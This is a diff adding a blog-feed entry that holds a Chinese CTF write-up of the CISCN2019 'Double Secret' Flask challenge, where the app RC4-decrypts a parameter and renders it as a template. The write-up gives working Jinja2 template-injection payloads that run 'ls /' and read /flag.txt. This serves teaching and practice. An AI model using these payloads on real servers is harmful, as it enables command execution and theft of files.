@@ -47,6 +47,19 @@
                 "buuctf",
                 "ssti"
             ]
+        },
+        {
+            "id": "http://odiws.github.io/2024/06/13/Secret/",
+            "url": "http://odiws.github.io/2024/06/13/Secret/",
+            "title": "’[CISCN2019 华东南赛区]Double Secret‘",
+            "date_published": "2024-06-13T11:56:57.000Z",
+            "content_html": "<h2 id=\"ciscn2019-华东南赛区double-secret\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2019-华东南赛区double-secret\">#</a> [CISCN2019 华东南赛区] Double Secret</h2>\n<p>由标题可以知道：有两个 secret；尝试 /secret</p>\n<p><img data-src=\"../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/1.png\" alt=\"1\"></p>\n<p>网页显示是给个参数他就会给你加密（但是却是解密）</p>\n<p>有两个 secret 可以在参数这里猜:</p>\n<p>加？secret=12345 发现错误：</p>\n<p><img data-src=\"../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/2.png\" alt=\"2\"></p>\n<p>发现是 ssti 报错：盲猜 jinja2：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hcHAtODU1Zi5weQ==\">找 app.py</span>：</p>\n<pre><code class=\"language-pyhton\"> if(secret==None):\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密\n    deS=rc.do_crypt(secret)\n \n    a=render_template_string(safe(deS))\n \n    if 'ciscn' in a.lower():\n        return 'flag detected!'  \n    return a\n</code></pre>\n<p>可以发现是加了一个 rc4 的解密，密钥为：HereIsTreasure</p>\n<p>我直接搞个加密 rc4 的密钥一样就可以了：</p>\n<p>payload：</p>\n<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;\n</code></pre>\n<p><img data-src=\"../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/4.png\" alt=\"4\"></p>\n<p>读 flag.txt  payload：</p>\n<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/flag.txt').read()&#125;&#125;\n</code></pre>\n<p>但是要加一个 url 加密，在加一个加密所有字符（因为好像直接输入会丢字符）</p>\n<p><img data-src=\"../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/3.png\" alt=\"3\"></p>\n",
+            "tags": [
+                "buuctf",
+                "flask",
+                "ssti",
+                "rc4"
+            ]
         }
     ]
 }
